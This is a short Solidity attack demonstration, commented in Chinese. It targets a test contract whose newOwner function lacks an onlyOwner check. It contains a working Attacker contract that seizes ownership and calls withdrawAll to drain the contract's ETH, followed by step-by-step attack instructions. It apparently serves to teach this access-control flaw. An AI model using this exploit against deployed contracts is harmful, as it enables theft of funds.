// 攻擊示範：利用 Unprotected Transfer Value 漏洞
// 主要問題是 newOwner 函式沒有 onlyOwner 修飾符，任何人都可以註冊為新的擁有者

contract Attacker {
    TestContract victim;
    
    constructor(address _victim) public {
        victim = TestContract(_victim);
    }
    
    // 第一步：註冊自己為合約的擁有者
    function becomeOwner() public {
        victim.newOwner(address(this));
    }
    
    // 第二步：取走合約中的所有資金
    function drainFunds() public {
        victim.withdrawAll();
    }
    
    // 用於接收提款的回退函式
    function() external payable {
        // 資金成功提取
    }
}

/* 攻擊步驟：
1. 部署 TestContract 並存入一些 ETH
2. 部署 Attacker 合約，將 TestContract 的地址作為參數
3. 調用 Attacker.becomeOwner() - 這將註冊 Attacker 合約為 TestContract 的擁有者
4. 調用 Attacker.drainFunds() - 這將提取 TestContract 中的所有資金

關鍵漏洞說明：
- newOwner 函式沒有 onlyOwner 修飾符，因此任何人都可以註冊自己或其他地址為擁有者
- 一旦成為擁有者，就可以呼叫 withdrawAll() 函式，將合約中的所有資金一次性取走
- this.balance 不設上限地轉移所有餘額是危險的，特別是在擁有權控制不嚴格的情況下
*/